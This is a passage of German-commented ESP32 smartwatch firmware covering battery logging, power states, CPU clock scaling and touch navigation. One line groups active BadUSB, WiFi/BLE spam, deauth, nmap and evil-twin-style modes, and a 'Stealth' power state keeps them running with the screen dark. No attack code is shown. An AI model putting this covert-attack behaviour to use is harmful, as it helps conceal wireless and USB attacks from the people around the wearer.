        // NVS-Schreiben nur jede 5. Messung (= alle 50min statt alle 10min) um NVS-Verschleiß zu reduzieren
        static int nvsWriteCounter = 0;
        nvsWriteCounter++;
        if (nvsWriteCounter >= 5) {
            nvsWriteCounter = 0;
            prefs.begin("clock", false);
            prefs.putInt("hCount", historyCount);
            prefs.putInt("hFmt", 2);
            prefs.putBytes("hData", batHistoryPct, MAX_HISTORY * sizeof(uint16_t));
            prefs.end();
        }
        AppPackage* curApp = AppManager::getAppByPage(currentPage);
        String curTid = curApp ? (curApp->driver.length() > 0 ? curApp->driver : curApp->id) : "";
        if (curTid == "mic") lastSecond = -1;
        
        // Batterie-Warnung bei <15% (nur wenn nicht am Laden)
        static bool lowBatWarned = false;
        bool isCharging2 = isChargingCached(false);
        uint8_t rawBat = getBattery();
        if (rawBat <= 15 && rawBat > 0 && !isCharging2 && !lowBatWarned) {
            lowBatWarned = true;
            saveMotionPrefs(); // Notfall-Sicherung der Schritte vor eventuellem Abschalten
            triggerVibration(); delay(200); triggerVibration();
            showToastColor("Akku niedrig! " + String(rawBat) + "%", 5000, TFT_RED);
        } else if (rawBat > 20 || isCharging2) {
            lowBatWarned = false;
        }
    }

    // System-Verlauf (CPU-Takt/-Temperatur) fuers Web-Dashboard: eigener, groeberer Sample-Takt
    // (15min) rein im RAM - kein NVS-Schreiben noetig, da nur fuer die Live-Ansicht gedacht.
    const unsigned long sysHistInterval = 900000; // 15 Minuten
    if (currentMillis - lastSysHistTime >= sysHistInterval || (lastSysHistTime == 0 && sysHistCount == 0)) {
        lastSysHistTime = currentMillis;
        float f = ESP.getCpuFreqMHz();
        float t = temperatureRead();
        if (sysHistCount < SYS_HIST_MAX) { sysHistFreq[sysHistCount] = f; sysHistTemp[sysHistCount] = t; sysHistCount++; }
        else {
            for (int i = 1; i < SYS_HIST_MAX; i++) { sysHistFreq[i - 1] = sysHistFreq[i]; sysHistTemp[i - 1] = sysHistTemp[i]; }
            sysHistFreq[SYS_HIST_MAX - 1] = f; sysHistTemp[SYS_HIST_MAX - 1] = t;
        }
    }
}

// ---------------------------------------------------------
// Das NEUE, reparierte 5-Stufen Power Management
// ---------------------------------------------------------
void handlePowerManagement(unsigned long currentMillis) {
    if(matrixMode) return; 
    
    static unsigned long lastPmuHealthCheck = 0;
    if (currentMillis - lastPmuHealthCheck > 5000) {
        lastPmuHealthCheck = currentMillis;
        if (getBatteryVoltageCached(true) <= 0.01f) {
            Wire.end(); Wire.begin(10, 11);
            if (pmu.init(Wire, 10, 11, AXP2101_SLAVE_ADDRESS)) {
                pmu.enableBattVoltageMeasure();
                pmu.enableIRQ(XPOWERS_AXP2101_BAT_INSERT_IRQ | XPOWERS_AXP2101_BAT_REMOVE_IRQ | XPOWERS_AXP2101_VBUS_INSERT_IRQ | XPOWERS_AXP2101_VBUS_REMOVE_IRQ | XPOWERS_AXP2101_PKEY_SHORT_IRQ);
                pmu.clearIrqStatus();
                refreshPowerTelemetry(true);
            }
            drv.begin(Wire, 10, 11);
            bmaInvalidate();
        }
    }

    unsigned long elapsed = currentMillis - lastTouchTime; 
    static int lastPowerState = 1; 
    refreshPowerTelemetry(false);
    bool isCharging = isChargingCached(false);
    bool hacksRunning = (jigglerActive || badUsbActive || wifiSpamActive || bleSpamActive || deauthActive || nmapActive || evilActive || probeMonActive || bleScanActive);
    
    AppPackage* curApp = AppManager::getAppByPage(currentPage);
    String curTid = curApp ? (curApp->driver.length() > 0 ? curApp->driver : curApp->id) : "";

    // Basis-Einstufung nach Zeit
    if (curTid == "flashlight" || curTid == "battery") powerState = 1; 
    else if (elapsed < time_dim_start) powerState = 1;                  // State 1: Aktiv (Hell)
    else if (elapsed < time_aod_start) powerState = 2;                  // State 2: Dimmen
    else if (elapsed < time_sleep_start) powerState = aodActive ? 3 : 4; // State 3: AOD (sofern aodActive aktiv)
    else powerState = 4;                                                // State 4: Soft Sleep Vorbereitung

    // Absolute Overrides für State 4 (Schlafen)
    if (powerState == 4) {
        if (isCharging && aodActive) {
            powerState = 3;        // B: Strom -> Dauer-AOD
        } else if (hacksRunning) {
            powerState = 5;        // A: Hacks -> Stealth (Bildschirm aus, CPU an)
        } else if (wlanActive) {
            // Wenn Hotspot ohne verbundenen Client in den Schlaf geht -> Hotspot abschalten,
            // damit echter Hardware-Light-Sleep (State 4, ~3-5 mA statt ~110 mA) moeglich wird!
            if (!wlanClientMode && WiFi.softAPgetStationNum() == 0) {
                stopHotspotAP();
            } else {
                powerState = 5;    // Aktive Web-Session oder Client-Modus -> Hintergrund weiterlaufen lassen
            }
        }
    }

    // LoRa SX1262 Transceiver im Schlafmodus in den <1 uA Sleep schicken (spart ~12 mA Dauer-RX)
    LoraManager::setLowPower(powerState >= 4);

    // Krone Hardware Button Check (PEK)
    pmu.getIrqStatus(); 
    bool pekPressed = pmu.isPekeyShortPressIrq(); 
    pmu.clearIrqStatus(); 
    
    if (pekPressed) {
        triggerVibration(); 
        if (curTid == "flashlight" || curTid == "battery") { currentPage = 5; } 
        if (powerState >= 3) {
            // Aus AOD/Sleep aufwecken: elapsed = 0 → powerState = 1 (volle Helligkeit)
            lastTouchTime = currentMillis;
        } else {
            // Aus Aktiv/Dim: direkt in AOD/Sleep springen
            lastTouchTime = currentMillis - (aodActive ? time_aod_start : time_sleep_start) - 10;
        }
        lastSecond = -1;
        return; 
    }

    // Hardware Display On/Off Logik
    if ((lastPowerState == 4 || lastPowerState == 5) && (powerState < 4)) {
        tft.writecommand(0x11); // Wake up Display!
        delay(120);
    } 
    else if ((lastPowerState < 4) && (powerState == 4 || powerState == 5)) {
        tft.writecommand(0x10); // Sleep Display!
    }

    lastPowerState = powerState;
    bool isAwake = (powerState == 1 || powerState == 2 || powerState == 3); 
    static bool wasAwake = true;
    
    // Effiziente CPU-Taktung zur Senkung des Powerdraws:
    // - 240 MHz nur bei aktiven RF-Angriffen, Mikrofon oder aktiver Bedienung mit WLAN
    // - 160 MHz bei normaler UI-Bedienung (State 1 ohne WLAN) oder WLAN im Hintergrund (State 2/3/5)
    // - 80 MHz in Dim/AOD/Sleep ohne aktives WLAN (spart ~25 mA gegenueber 240 MHz!)
    int desiredFreq = 80;
    if (hacksRunning || micActive || (powerState == 1 && wlanActive)) { desiredFreq = 240; }
    else if (powerState == 1 || wlanActive) { desiredFreq = 160; }
    else { desiredFreq = 80; }
    if (ESP.getCpuFreqMHz() != desiredFreq) { setCpuFrequencyMhz(desiredFreq); }

    // Helligkeits-Steuerung
    if (powerState == 1) { 
        setBrightness(maxBright); 
    } 
    else if (powerState == 2) { 
        float fade = (float)(elapsed - time_dim_start) / (time_aod_start - time_dim_start); 
        setBrightness(maxBright - ((maxBright - minBright) * fade)); 
    } 
    else if (powerState == 3) { 
        setBrightness(minBright); 
    } 
    else if (powerState == 4 || powerState == 5) {
        setBrightness(0);
    }

    // Mikrofon automatisch ausschalten wenn Bildschirm zu AOD/Sleep übergeht
    if (micActive && powerState >= 3) {
        stopMic();
    }
    
    // Screen Blanking
    if (isAwake != wasAwake) { 
        wasAwake = isAwake; 
        if (!isAwake) { tft.fillScreen(TFT_BLACK); lastSecond = -1; } 
        else { tft.fillScreen(cBG); lastSecond = -1; } 
    }

    // Echter Hardware Tiefschlaf (Nur in State 4 erlaubt!)
    if (powerState == 4) {
        esp_sleep_enable_timer_wakeup(1000000); // 1 Sekunde
        esp_sleep_enable_ext0_wakeup((gpio_num_t)TOUCH_INT, 0); // Display-Touch weckt CPU auf!
        esp_light_sleep_start();
        if (esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_EXT0) {
            tft.writecommand(0x11);
            delay(120);
            lastTouchTime = millis();
            powerState = 1;
            lastPowerState = 1;
            wasAwake = true;
            setBrightness(maxBright);
            LoraManager::setLowPower(false);
            lastSecond = -1;
        }
    }
}

bool isPageEnabled(int p) { if(p==0) return enP0; if(p==1) return enP1; if(p==2) return enP2; if(p==3) return enP3; return false; }

static void handleAppTouch(AppPackage* app, int lastX, int touchY) {
    if (!app) return;
    if (app->touchFn) {
        app->touchFn(lastX, touchY);
        return;
    }
    AppManager::handleDynamicAppTouch(app, lastX, touchY);
}

void handleTouchInput() {
    if(matrixMode) return;
    int16_t x[2], y[2]; 
    bool isTouched = (touch.getPoint(x, y, 1) > 0); 

    // --- HOTSPOT DISCONNECT DIALOG TOUCH INTERCEPTION ---
    if (hotspotPromptActive) {
        if (isTouched) {
            int tx = x[0];
            int ty = y[0];
            lastTouchTime = millis();
            // Dialog Buttons befinden sich bei Y = 130 bis 215
            if (ty >= 130 && ty <= 215) {
                if (tx <= 120) {
                    hotspotPromptActive = false;
                    triggerVibration();
                    showToastColor("Hotspot bleibt an", 2500, TFT_GREEN);
                    lastSecond = -1;
                } else {
                    hotspotPromptActive = false;
                    stopHotspotAP();
                    triggerVibration();
                    showToastColor("Hotspot aus", 2500, 0x4208);
                    lastSecond = -1;
                }
            }
        }
        return; // Verhindert Klicks auf darunterliegende Pages
    }

    AppPackage* curApp = AppManager::getAppByPage(currentPage);
    bool isApp = (curApp != nullptr); 

    if (isTouched) {
        // Doppel-Tipp weckt aus AOD (State 3), Sleep (State 4) und Stealth (State 5)
        if (powerState == 3 || powerState == 4 || powerState == 5) { 
            if (millis() - lastTapTime < 600) { lastTouchTime = millis(); } 
            lastTapTime = millis(); 
            delay(100); 
            return; 
        } 
        else {
            int touchY = y[0] - 34; if (currentPage == 11) touchY = y[0]; 

            // Live-Helligkeits-Slider im Control Center (Page 5) mit direktem Feedback
            if (currentPage == 5 && touchY >= 22 && touchY <= 64 && x[0] >= 10 && x[0] <= 230) {
                int bVal = map(x[0], 15, 225, 10, 255);
                bVal = constrain(bVal, 10, 255);
                if (abs(bVal - maxBright) > 3) {
                    maxBright = bVal;
                    setBrightness(maxBright);
                    lastSecond = -1;
                }
            }

            if (isApp) {
                // Alle App-Pages inkl. Menü 22/23: Nur Position tracken, Tap wird erst beim Loslassen ausgewertet
            }
            lastTouchTime = millis(); lastX = x[0]; lastY = y[0];
            if (!isSwiping) { startX = lastX; startY = lastY; isSwiping = true; } 
        }
    } else if (isSwiping) {
        isSwiping = false; int dx = lastX - startX; int dy = lastY - startY;
        bool isQSApp = (curApp && (curApp->id == "battery" || curApp->id == "flashlight"));
        
        // Save brightness to NVS if user just finished dragging slider on Page 5
        if (currentPage == 5 && (startY - 34) >= 22 && (startY - 34) <= 64) {
            prefs.begin("clock", false);
            prefs.putInt("maxB", maxBright);
            prefs.end();
        }

        // --- Swipe UP to kill (in App-Pages: beendet gezielt die aktuelle App) ---
        if (dy < -35 && abs(dy) > abs(dx) && isApp) {
            tft.fillRect(80, 0, 80, 40, TFT_RED);
            tft.setTextDatum(MC_DATUM); tft.setTextColor(TFT_WHITE, TFT_RED);
            tft.drawString("KILL", 120, 20, 2);
            delay(200);
            if (curApp) {
                if (curApp->id == "mic" || curApp->driver == "mic") stopMic();
                if (curApp->id == "flashlight" || curApp->driver == "flashlight") setBrightness(maxBright);
                AppManager::stopJsApp(curApp);
            }
            triggerVibration();
            // Rücksprung
            if (isQSApp) slideToPage(5, 0, 1);
            else slideToPage(6, 0, 1);
            lastTouchTime = millis(); return;
        }
        // --- Swipe Horizontal in Apps (Zurück zum Menü in BEIDE Richtungen: links oder rechts) ---
        else if (abs(dx) > 35 && abs(dx) > abs(dy) && isApp) {
            triggerVibration();
            if (curApp && (curApp->id == "mic" || curApp->driver == "mic")) stopMic();
            if (curApp && (curApp->id == "flashlight" || curApp->driver == "flashlight")) setBrightness(maxBright);
            if (isQSApp) slideToPage(5, (dx > 0) ? 1 : -1, 0);
            else slideToPage(6, (dx > 0) ? 1 : -1, 0);
            lastTouchTime = millis(); return;
        }
        // --- Swipe DOWN in Apps (Zurück zum Menü) ---
        else if (dy > 35 && abs(dy) > abs(dx) && isApp) {
            triggerVibration();
            if (curApp && (curApp->id == "mic" || curApp->driver == "mic")) stopMic();
            if (curApp && (curApp->id == "flashlight" || curApp->driver == "flashlight")) setBrightness(maxBright);
            if (isQSApp) slideToPage(5, 0, 1);
            else slideToPage(6, 0, 1);
            lastTouchTime = millis(); return;
        }
        // Productivity Menu (22) -> Paging oder Uebersicht (6)
        else if (currentPage == 22 && abs(dx) > 35 && abs(dx) > abs(dy)) {
            int totalG = AppManager::getAppCount(CAT_PRODUCTIVITY, true);
            int maxP = (totalG > 0) ? ((totalG - 1) / 8) : 0;
            if (dx < -35) {
                if (AppManager::prodMenuPage < maxP) {
                    AppManager::prodMenuPage++;
                    triggerVibration(); lastSecond = -1; lastTouchTime = millis(); return;
                } else {
                    triggerVibration(); slideToPage(6, -1, 0); lastTouchTime = millis(); return;
                }
            } else if (dx > 35 && AppManager::prodMenuPage > 0) {
                AppManager::prodMenuPage--;
                triggerVibration(); lastSecond = -1; lastTouchTime = millis(); return;
            }
        }
        // Security Menu (23) -> Paging oder Uebersicht (6)
        else if (currentPage == 23 && abs(dx) > 35 && abs(dx) > abs(dy)) {
            int totalB = AppManager::getAppCount(CAT_SECURITY, true);
            int maxP = (totalB > 0) ? ((totalB - 1) / 8) : 0;
            if (dx > 35) {
                if (AppManager::secMenuPage < maxP) {
                    AppManager::secMenuPage++;
                    triggerVibration(); lastSecond = -1; lastTouchTime = millis(); return;
                } else {
                    triggerVibration(); slideToPage(6, 1, 0); lastTouchTime = millis(); return;
                }
            } else if (dx < -35 && AppManager::secMenuPage > 0) {
                AppManager::secMenuPage--;
                triggerVibration(); lastSecond = -1; lastTouchTime = millis(); return;
            }
        }
        // --- Swipe UP to kill from Menu Pages 22/23 ---
        else if (dy < -40 && abs(dy) > abs(dx) && (currentPage == 22 || currentPage == 23)) {
            killAllApps(); triggerVibration();
            tft.fillRect(80, 0, 80, 40, TFT_RED);
            tft.setTextDatum(MC_DATUM); tft.setTextColor(TFT_WHITE, TFT_RED);
            tft.drawString("KILL", 120, 20, 2);
            delay(200);
            slideToPage(6, 0, 1);
            lastTouchTime = millis(); return;
        }
        // --- Watchface horizontal swipe (Carousel Navigation) ---
        else if (abs(dx) > 40 && abs(dx) > abs(dy)) { 
            if (currentPage == 0 || (currentPage >= 1 && currentPage <= 3)) { 
                if (!carouselOrder.empty()) {
                    if (dx > 0) {
                        // Swipe Right -> Vorheriges Face im Karussell
                        carouselIndex = (carouselIndex - 1 + (int)carouselOrder.size()) % (int)carouselOrder.size();
                    } else {
                        // Swipe Left -> Nächstes Face im Karussell
                        carouselIndex = (carouselIndex + 1) % (int)carouselOrder.size();
                    }
                    triggerVibration();
                    slideToPage(0, (dx > 0) ? 1 : -1, 0);
                    mainPage = 0;
                    lastTouchTime = millis();
                    return;
                }
            }
        } 
        else if (dy > 40 && abs(dy) > abs(dx)) { 
            Serial.printf("[TOUCH] Swipe DOWN page=%d -> ziel: %s\n", currentPage, (currentPage == 0 || (currentPage >= 1 && currentPage <= 3)) ? "5" : (currentPage == 6) ? "main" : "?");
            if (currentPage == 0 || (currentPage >= 1 && currentPage <= 3)) { triggerVibration(); slideToPage(5, 0, 1); } 
            else if (currentPage == 6) { triggerVibration(); slideToPage(mainPage, 0, 1); } 
        } 
        else if (dy < -40 && abs(dy) > abs(dx)) { 
            Serial.printf("[TOUCH] Swipe UP page=%d -> ziel: %s\n", currentPage, (currentPage == 0 || (currentPage >= 1 && currentPage <= 3)) ? "6" : (currentPage == 5) ? "main" : "?");
            if (currentPage == 0 || (currentPage >= 1 && currentPage <= 3)) { triggerVibration(); slideToPage(6, 0, -1); } 
            else if (currentPage == 5) { triggerVibration(); slideToPage(mainPage, 0, -1); } 
        }
        else if (abs(dx) <= 35 && abs(dy) <= 35) { 
            int touchY = lastY - 34; 
            if (currentPage == 0) {
                triggerVibration();
                if (touchY <= 25 && lastX >= 80 && lastX <= 160 && NotificationManager::getUnreadCount() > 0) {
                    NotificationManager::markAllRead();
                    AppManager::launchAppById("notif");
                    lastSecond = -1;
                    return;
                }
                int activeFace = (!carouselOrder.empty() && carouselIndex >= 0 && carouselIndex < (int)carouselOrder.size()) ? carouselOrder[carouselIndex] : 0;
                
                if (activeFace == FACE_ULTRA_DASH) {
                    if (touchY >= 116 && touchY <= 155 && lastX >= 98) {
                        AppManager::launchAppById("battery");
                        lastSecond = -1;
                        return;
                    }
                    if (touchY >= 74 && touchY <= 112 && lastX >= 98) {
                        showToastColor("Schritte: " + String(stepCount) + " / " + String(stepGoal), 2500, 0x07E0);
                        lastSecond = -1;
                        return;
                    }
                } else if (activeFace == FACE_CHRONO) {
                    if (touchY >= 75 && touchY <= 130 && lastX >= 145 && lastX <= 198) {
                        AppManager::launchAppById("battery");
                        lastSecond = -1;
                        return;
                    }
                    if (touchY >= 75 && touchY <= 130 && lastX >= 42 && lastX <= 95) {
                        showToastColor("Schritte: " + String(stepCount) + " / " + String(stepGoal), 2500, 0x07E0);
                        lastSecond = -1;
                        return;
                    }
                } else if (activeFace == FACE_CASIO) {
                    if (touchY >= 115 && lastX <= 115) {
                        AppManager::launchAppById("battery");
                        lastSecond = -1;
                        return;
                    }
                    if (touchY >= 115 && lastX > 115) {
                        showToastColor("Schritte: " + String(stepCount) + " / " + String(stepGoal), 2500, 0x07E0);
                        lastSecond = -1;
                        return;
                    }
                } else if (activeFace == FACE_PARENTS) {
                    parentViewMode = 1 - parentViewMode;
                    triggerVibration();
                    showToast(parentViewMode == 0 ? "Eltern-Sicht" : "Kinder-Projektion", 1500);
                    lastSecond = -1;
                    return;
                } else if (activeFace == FACE_CYBERPUNK) {
                    if (touchY >= 135 && touchY <= 165) {
                        AppManager::launchAppById("battery");
                        lastSecond = -1;
                        return;
                    }
                    showToastColor("CPU " + String(ESP.getCpuFreqMHz()) + "MHz | Akku " + String(getBattery()) + "%", 2000, 0x07FF);
                    lastSecond = -1;
                    return;
                } else if (activeFace == FACE_WORDCLOCK) {
                    time_t nw; time(&nw); struct tm *tmN = localtime(&nw);
                    char tBuf[16]; snprintf(tBuf, sizeof(tBuf), "%02d:%02d:%02d", tmN->tm_hour, tmN->tm_min, tmN->tm_sec);
                    showToastColor(String(tBuf), 2000, 0xFFFF);
                    lastSecond = -1;
                    return;
                }
                triggerVibration();
                lastSecond = -1;
            }
            else if (currentPage == 3) {
                parentViewMode = 1 - parentViewMode;
                triggerVibration();
                showToast(parentViewMode == 0 ? "Eltern-Sicht" : "Kinder-Projektion", 1500);
                lastSecond = -1;
                return;
            }
            else if (currentPage == 5) { 
                // 1. Grab Handle / Top Bar: Swipe back up or tap to dismiss to Watchface
                if (touchY <= 24) {
                    triggerVibration();
                    slideToPage(mainPage, 0, -1);
                    lastSecond = -1;
                    return;
                }
                // 2. Brightness Slider Tap: Set brightness and persist to NVS
                if (touchY >= 22 && touchY <= 64) {
                    int bVal = map(lastX, 15, 225, 10, 255);
                    bVal = constrain(bVal, 10, 255);
                    maxBright = bVal;
                    setBrightness(maxBright);
                    prefs.begin("clock", false);
                    prefs.putInt("maxB", maxBright);
                    prefs.end();
                    triggerVibration();
                    lastSecond = -1;
                    return;
                }
                // 3. Row 0: Hotspot (Left) and Stummschaltung / DND (Right)
                if (touchY >= 66 && touchY <= 110) {
                    if (lastX < 120) {
                        triggerVibration();
                        toggleWLAN();
                        lastSecond = -1;
                        return;
                    } else {
                        triggerVibration();
                        toggleVibra();
                        lastSecond = -1;
                        return;
                    }
                }
                // 4. Row 1: Taschenlampe (Left) and USB-Modus (Right)
                if (touchY >= 112 && touchY <= 156) {
                    if (lastX < 120) {
                        triggerVibration();
                        AppManager::launchAppById("flashlight");
                        lastSecond = -1;
                        return;
                    } else {
                        triggerVibration();
                        toggleUsbHid();
                        lastSecond = -1;
                        return;
                    }
                }
                // 5. Row 2: LoRa Funk (Left) and Stop Apps (Right)
                if (touchY >= 158) {
                    if (lastX < 120) {
                        triggerVibration();
                        AppManager::launchAppById("lora");
                        lastSecond = -1;
                        return;
                    } else {
                        triggerVibration();
                        killAllApps();
                        showToast("Alle Apps gestoppt");
                        lastSecond = -1;
                        return;
                    }
                }
            } 
            else if (currentPage == 6 || currentPage == 22 || currentPage == 23) { 
                handleAppLauncherTouch(lastX, touchY);
            }
            // === Dynamische App-Page Taps (nur bei echtem Tap, nicht bei Swipe) ===
            else if (curApp) {
                if (curApp->id == "flashlight" || curApp->driver == "flashlight") {
                    if (AppManager::getAppStateBool(curApp->id, "fullscreen", false)) {
                        // Bei Tippen auf Vollbild-Taschenlampe: Zurueck ins Einstellungsmenue wechseln!
                        AppManager::setAppStateBool(curApp->id, "fullscreen", false);
                        triggerVibration();
                        lastSecond = -1;
                        return;
                    }
                }
                if (touchY <= 0) {
                    // Oberer Header angetippt: Zurück zum Menü
                    triggerVibration();
                    if (curApp->id == "mic" || curApp->driver == "mic") stopMic();
                    if (curApp->id == "flashlight" || curApp->driver == "flashlight") setBrightness(maxBright);
                    if (isQSApp) slideToPage(5, -1, 0);
                    else slideToPage(6, -1, 0);
                    return;
                }
                handleAppTouch(curApp, lastX, touchY);
            }
            lastTouchTime = millis();
        }
    }
}